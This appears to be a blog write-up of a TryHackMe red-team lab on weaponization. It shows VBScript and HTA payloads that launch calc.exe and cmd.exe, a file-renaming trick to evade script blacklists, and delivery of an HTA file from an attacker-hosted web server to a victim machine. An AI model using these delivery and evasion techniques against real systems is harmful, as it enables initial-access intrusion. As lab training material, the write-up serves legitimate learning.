---
title:  "THM: Weaponization"
date:   2024-04-24 19:00:00 +0000
categories: [Red]
tags: [Red]
---

![img](/assets/img/w.png)  



---
Ref: 

- [THM: Red Team Recon](https://tryhackme.com/r/room/weaponization)

- [Red Team Toolkit](https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development)

---

Task 1 - Introduction
---

In this room, we will be discussing different techniques used for weaponization.

![img](/assets/img/w01.png)

What is Weaponization

Weaponization is the second stage of the Cyber Kill Chain model. In this stage, the attacker generates and develops their own malicious code using deliverable payloads such as word documents, PDFs, etc. [1]. The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.

Most organizations have Windows OS running, which is going to be a likely target. An organization's environment policy often blocks downloading and executing .exe files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB, or web methods.

The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the command and control environment of the red team infrastructure.


![img](/assets/img/w02.png)

For more information about red team toolkits, please visit the following: a GitHub repository that has it all, including initial access, payload development, delivery methods, and others.

Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:

- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- PowerShell (PSH)

---



Task 2 - Deploy the Windows Machine
---


In order to follow up along with the task content and apply what is given in this room, you need to start the attached machine by using the green Start Machine button in this task, and wait a few minutes for it to boot up. To access the attached machine, you can either use the split in browser view or connect through the RDP.

If you prefer to connect through the Remote Desktop Protocol (RDP), first make sure you are connected to the VPN. Then an RDP client is required to connect to the attached Windows 10 machine. You can connect using the xfreerdp tool, which is available on the TryHackMe AttackBox.

To connect  via xfreerdp use the following command:

Terminal
```
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3
```

The username: thm  and the password: TryHackM3 


---

Task 3 - Windows Scripting Host - WSH
---

Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe. For more information about VBScript, please visit [here](https://en.wikipedia.org/wiki/VBScript). It is important to note that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for the red teamers.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

```
Dim message 
message = "Welcome to THM"
MsgBox message
```
In the first line, we declared the message variable using Dim. Then we store a string value of Welcome to THM in the message variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit [here](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN). Then, we use wscript to run and execute the content of hello.vbs. As a result, A Windows message will pop up with the Welcome to THM message.

![img](/assets/img/w03.png)

Now let's use the VBScript to run executable files. The following vbs code is to invoke the Windows calculator, proof that we can execute .exe files using the Windows native engine (WSH).

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
We create an object of the WScript library using CreateObject to call the execution payload. Then, we utilize the Run method to execute the payload. For this task, we will run the Windows calculator calc.exe. 

To execute the vbs file, we can run it using the wscript as follows, 

Terminal
```
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
```

We can also run it via cscript as follows,

Terminal
```
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```
As a result, the Windows calculator will appear on the Desktop.


![img](/assets/img/w04.png)


Another trick. If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows,

Terminal
```
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

The result will be as exact as executing the vbs files, which run the calc.exe binary.


![img](/assets/img/w05.png)

---


Task 4 - An HTML Application - HTA
---


### An HTML Application (HTA)

HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer. 

In the following example, we will use an ActiveXObject in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.
```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows,

Terminal
```
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

On the victim machine, visit the malicious link using Microsoft Edge, http://10.8.232.37:8090/payload.hta. Note that the 10.8.232.37 is the AttackBox's IP address.


![img](/assets/img/w06.png)

Once we press Run, the payload.hta gets executed, and then it will invoke the cmd.exe. The following figure shows that we have successfully executed the cmd.exe.


![img](/assets/img/w07.png)


